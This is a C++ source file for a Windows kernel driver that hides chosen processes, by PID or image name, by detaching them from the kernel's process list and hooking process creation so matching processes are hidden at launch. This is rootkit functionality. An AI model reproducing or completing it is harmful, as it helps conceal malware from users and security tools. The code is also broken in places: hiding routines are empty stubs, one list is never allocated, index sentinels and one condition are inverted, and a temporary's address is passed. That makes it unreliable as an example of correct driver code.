#include "hide-proc.h"


namespace hide_proc
{
	void DrvRegister()
	{
		kHideProcIdList = new Vector<eprocess::ProcInfo>();
		kProcIdMutex.Create();
		kProcImageMutex.Create();
		PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&hide_proc::ProcessNotifyCallBack, FALSE);
	}

	void DrvUnload()
	{
		delete kHideProcIdList;
		PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&hide_proc::ProcessNotifyCallBack, TRUE);
	}

	bool HideProc(const eprocess::ProcInfo* info)
	{
		kProcIdMutex.Lock();

		

		kProcIdMutex.Unlock();
		return true;
	}

	bool UnhideProc(const eprocess::ProcInfo* info)
	{
		return true;
	}

	size_t GetIndexInHiddenProcIdList(size_t pid)
	{
		size_t ret = -1;
		kProcIdMutex.Lock();
		for (int i = 0; i < kHideProcIdList->Size(); i++)
		{
			if ((*kHideProcIdList)[i].GetParentPid() == pid ||
				(*kHideProcIdList)[i].GetPid() == pid)
			{
				ret = i;
				break;
			}
		}
		kProcIdMutex.Unlock();
		return ret;
	}

	void AddProcIdToHideList(size_t pid)
	{
		kProcIdMutex.Lock();
		kHideProcIdList->PushBack(pid);
		kProcIdMutex.Unlock();
		return;

	}
	void DeleteProcIdFromHideList(size_t pid)
	{
		bool found = false;
		kProcIdMutex.Lock();
		for (int i = 0; i < kHideProcIdList->Size(); i++)
		{
			if ((*kHideProcIdList)[i].GetPid() == pid)
			{
				kHideProcIdList->EraseUnordered(i);
				UnhideProc(&eprocess::ProcInfo(pid));
				found = true;
				break;
			}
		}
		kProcIdMutex.Unlock();
		return;
	}


	size_t GetIndexInHiddenProcImageList(const String<WCHAR>* image_path)
	{
		size_t ret = false;
		kProcImageMutex.Lock();
		for (int i = 0; i < kHideProcImageList->Size(); i++)
		{
			if ((*kHideProcImageList)[i] == *image_path)
			{
				ret = i;
				break;
			}
		}
		kProcImageMutex.Unlock();
		return ret;
	}

	void AddProcImageToHideList(const String<WCHAR>* image_path)
	{
		kProcImageMutex.Lock();
		kHideProcImageList->PushBack(*image_path);
		kProcImageMutex.Unlock();
	}

	void DeleteProcImageFromHideList(const String<WCHAR>* image_path)
	{
		kProcImageMutex.Lock();

		for (int i = 0; i < kHideProcImageList->Size(); i++)
		{
			if ((*kHideProcImageList)[i] == *image_path)
			{
				kHideProcImageList->EraseUnordered(i);
				break;
			}
		}
		kProcImageMutex.Unlock();
	}


	void HideOnProcessList()
	{
		// What if SYSTEM_PROCESS_ID is detached? We will have to use ZwQueryObject or PsLookupProcessByProcessId to find a process that is not detached
		eprocess::ProcInfo cur_proc(SYSTEM_PROCESS_ID);
		eprocess::ProcInfo next_proc;

		while (true)
		{
			// Hide process
			next_proc = cur_proc.GetNextProc();

			if (GetIndexInHiddenProcImageList(&(cur_proc.GetProcessImageName())) != -1 || GetIndexInHiddenProcIdList(cur_proc.GetPid()) != -1)
			{
				cur_proc.DetachFromProcessList();
			}

			if (next_proc.GetPid() == SYSTEM_PROCESS_ID)
			{
				break;
			}
			cur_proc = next_proc;
		}
	}

	void HideOnProcessList(const String<WCHAR>* image_path)
	{
		// What if SYSTEM_PROCESS_ID is detached? We will have to use ZwQueryObject or PsLookupProcessByProcessId to find a process that is not detached
		eprocess::ProcInfo cur_proc(SYSTEM_PROCESS_ID);
		eprocess::ProcInfo next_proc;

		while (true)
		{
			// Hide process
			next_proc = cur_proc.GetNextProc();

			if (cur_proc.GetProcessImageName() == *image_path)
			{
				if (GetIndexInHiddenProcIdList(cur_proc.GetPid()) != -1)
				{
					AddProcIdToHideList(cur_proc.GetPid());
				}
			}

			if (next_proc.GetPid() == SYSTEM_PROCESS_ID)
			{
				break;
			}
			cur_proc = next_proc;
		}
	}

	void ProcessNotifyCallBack(PEPROCESS eprocess, size_t pid, PPS_CREATE_NOTIFY_INFO create_info)
	{
		if (create_info) // Process creation
		{
			if (create_info->ImageFileName == nullptr || create_info->FileOpenNameAvailable == FALSE)
			{
				return;
			}
			
			String<WCHAR> process_image_name(*(create_info)->ImageFileName);
			size_t index = GetIndexInHiddenProcIdList(pid);
			if (index != -1)
			{
				(*kHideProcIdList)[index].DetachFromProcessList();
				return;
			}
			index = GetIndexInHiddenProcImageList(&process_image_name);
			if (index != -1)
			{
				AddProcIdToHideList(pid);
				(*kHideProcIdList)[index].DetachFromProcessList();
				return;
			}
		}
		else // Process termination
		{
			if (GetIndexInHiddenProcIdList(pid))
			{
				DeleteProcIdFromHideList(pid);
			}
		}
	}


}

